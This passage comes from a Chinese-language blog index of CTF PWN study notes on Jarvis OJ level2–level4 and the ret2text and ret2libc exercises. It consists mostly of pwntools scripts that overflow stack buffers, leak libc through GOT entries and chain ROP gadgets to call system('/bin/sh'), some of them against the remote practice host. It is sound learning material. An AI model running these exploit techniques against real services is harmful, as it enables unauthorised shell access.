T3(level2)</h3><ul><li>存在<strong>system</strong>函数和<strong>“/bin/sh”</strong>字符串，但是不在一起使用</li><li><strong>vulnerable_function</strong>函数中buf长度为0x88，但读取长度为0x100</li><li>构造payload</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn2.jarvisoj.com"</span><span class="token punctuation">,</span><span class="token number">9878</span><span class="token punctuation">)</span>system_plt_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x804A024</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token comment" spellcheck="true">#覆盖buf</span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token comment" spellcheck="true">#覆盖rbp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_plt_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#system函数的地址</span>payload <span class="token operator">+=</span> <span class="token string">"c"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token comment" spellcheck="true">#system函数的返回地址（随意）</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#传入system函数的参数（即"/bin/sh"字符串）的地址</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1118-T4-level2-x64"><a href="#1118-T4-level2-x64" class="headerlink" title="1118 T4(level2_x64)"></a>1118 T4(level2_x64)</h3><ul><li>同上，但是因为是64位所以参数传递方式不同</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#p=process("level2_x64")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn2.jarvisoj.com"</span><span class="token punctuation">,</span><span class="token number">9882</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload="a"*0x80+"b"*8+p64(0x4006b3)+p64(0x600a90)+p64(0x4004c0)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token comment" spellcheck="true">#覆盖buf</span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token comment" spellcheck="true">#覆盖rbp</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4006b3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pop rdi;ret 地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x600a90</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#需要放到rdi中的参数（即"/bin/sh"字符串）地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4004c0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#system函数地址</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><ul><li>在<strong>secure</strong>函数中有<strong>system(“/bin/sh”)</strong>，找到地址跳转过去即可</li><li><strong>gets</strong>函数读取到<strong>换行符”\n”</strong>才会结束，可用于溢出</li><li><strong>关键问题在于计算溢出的位数</strong></li><li>这道题的特殊之处在于：如果根据IDA中显示的地址偏移计算溢出需要的字节数，会得到错误的结果</li><li>方法一：使用gdb调试，在<strong>call _gets</strong>处下断点并运行，根据<strong>esp</strong>和<strong>偏移量</strong>计算出<strong>s</strong>的地址，再与<strong>ebp</strong>相减得出位数</li><li>方法二：使用<strong>cyclic</strong></li></ul><ol><li><p>生成一串字符串</p><pre><code>cyclic -hcyclic 200</code></pre></li><li><p>使用gdb运行，将生成的字符串输入，得到报错信息</p><pre><code>Invalid $PC address: 0x62616164</code></pre></li><li><p>使用cyclic计算出位数</p><pre><code>cyclic -l 0x62616164112</code></pre></li></ol><p>参考网页：</p><p><a href="https://www.jianshu.com/p/dd5fd511e0d3" target="_blank" rel="noopener">https://www.jianshu.com/p/dd5fd511e0d3</a></p><p><a href="https://blog.csdn.net/weixin_42306891/article/details/88726246（方法一）" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42306891/article/details/88726246（方法一）</a></p><p><a href="https://www.jianshu.com/p/37d416d7ea1d（方法二）" target="_blank" rel="noopener">https://www.jianshu.com/p/37d416d7ea1d（方法二）</a></p><h3 id="ret2libc-32"><a href="#ret2libc-32" class="headerlink" title="ret2libc_32"></a>ret2libc_32</h3><p>本题既没有<strong>system</strong>也没有<strong>“/bin/sh”</strong>字符串，需要泄露出libc</p><ol><li>构造一个ROP，调用<strong>puts</strong>函数输出<strong>puts函数在got中的地址</strong>（即<strong>puts函数的libc地址</strong>），然后返回<strong>main</strong>函数的开头</li><li>读取输出的libc地址，与<strong>libc中puts函数的地址</strong>相减，得到<strong>libc的基地址</strong></li><li>将libc的基地址与libc中<strong>system</strong>函数及<strong>“/bin/sh\x00”</strong>字符串的地址相加，得到它们的libc地址</li><li>构造payload</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc_32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc_32"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib32.so"</span><span class="token punctuation">)</span>puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#libc_start_main = elf.got['__libc_start_main']</span><span class="token comment" spellcheck="true">#vuln_addr = 0x080484DB</span>main_addr <span class="token operator">=</span> <span class="token number">0x804853C</span> payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token comment" spellcheck="true"># buf padding </span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># 32bit ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ret addr</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload += p32(libc_start_main)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"address!!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\xf7"</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> u32<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token comment" spellcheck="true"># buf padding </span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># 32bit ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"c"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># fake ret addr</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"address!!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2libc-64"><a href="#ret2libc-64" class="headerlink" title="ret2libc_64"></a>ret2libc_64</h3><p>与上一题基本一致，但因为是64位所以传参数的方式不同</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2libc_64"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ret2libc_64"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib64.so"</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400773</span>main <span class="token operator">=</span> <span class="token number">0x4006ca</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token comment" spellcheck="true"># buf padding </span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token comment" spellcheck="true"># 64bit rbp</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"address!!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"leak: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc base: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token comment" spellcheck="true"># buf padding </span>payload2 <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token comment" spellcheck="true"># 64bit rbp</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"address!!\n"</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1119-T1-level3"><a href="#1119-T1-level3" class="headerlink" title="1119 T1(level3)"></a>1119 T1(level3)</h3><p>和前面的题基本一致，但使用的不是puts函数而是write函数，write函数有三个参数</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token comment" spellcheck="true">#p = process("./level3")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"pwn2.jarvisoj.com"</span><span class="token punctuation">,</span><span class="token number">9879</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.19.so"</span><span class="token punctuation">)</span>write_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#libc_start_main = elf.got['__libc_start_main']</span>vuln_addr <span class="token operator">=</span> <span class="token number">0x0804844B</span><span class="token comment" spellcheck="true">#main_addr = 0x8048484 </span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token comment" spellcheck="true"># buf padding </span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># 32bit ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ret addr</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_got_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#payload += p32(libc_start_main)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\xf7"</span><span class="token punctuation">)</span>leak <span class="token operator">=</span> u32<span class="token punctuation">(</span>leak<span class="token punctuation">)</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token comment" spellcheck="true"># buf padding </span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># 32bit ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"c"</span><span class="token operator">*</span><span class="token number">4</span>  <span class="token comment" spellcheck="true"># fake ret addr</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1119-T2-level3-x64"><a href="#1119-T2-level3-x64" class="headerlink" title="1119 T2(level3_x64)"></a>1119 T2(level3_x64)</h3><ul><li>上一题的64位版</li><li>但因为找不到pop rdx;ret，无法控制第三个参数</li><li>然而只要第三个参数大于8就能正常运行</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level3_x64"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level3_x64"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./lib64.so"</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4006b3</span>pop_rsi_ret <span class="token operator">=</span> <span class="token number">0x4006b1</span>vuln <span class="token operator">=</span> <span class="token number">0x4005e6</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token comment" spellcheck="true"># buf padding </span>payload <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token comment" spellcheck="true"># 64bit rbp</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">10086</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"leak: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc base: "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token comment" spellcheck="true"># buf padding </span>payload2 <span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">8</span>  <span class="token comment" spellcheck="true"># 64bit rbp</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">,</span> payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1119-T3-level4"><a href="#1119-T3-level4" class="headerlink" title="1119 T3(level4)"></a>1119 T3(level4)</h3><p>和level3基本一致，但没有libc，因此要用pwntools中的DynELF泄漏system地址</p><p><strong>只能远程不能本地，原因不明</strong></p><p>参考网页：</p><p><a href="http://www.bubuko.com/infodetail-2625601.html（最详细）" target="_blank" rel="noopener">http://www.bubuko.com/infodetail-2625601.html（最详细）</a></p><p><a href="http://www.luyixian.cn/news_show_15304.aspx" target="_blank" rel="noopener">http://www.luyixian.cn/news_show_15304.aspx</a></p><p><a href="https://www.jianshu.com/p/7d0423459073（纯代码）" target="_blank" rel="noopener">https://www.jianshu.com/p/7d0423459073（纯代码）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 入门 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
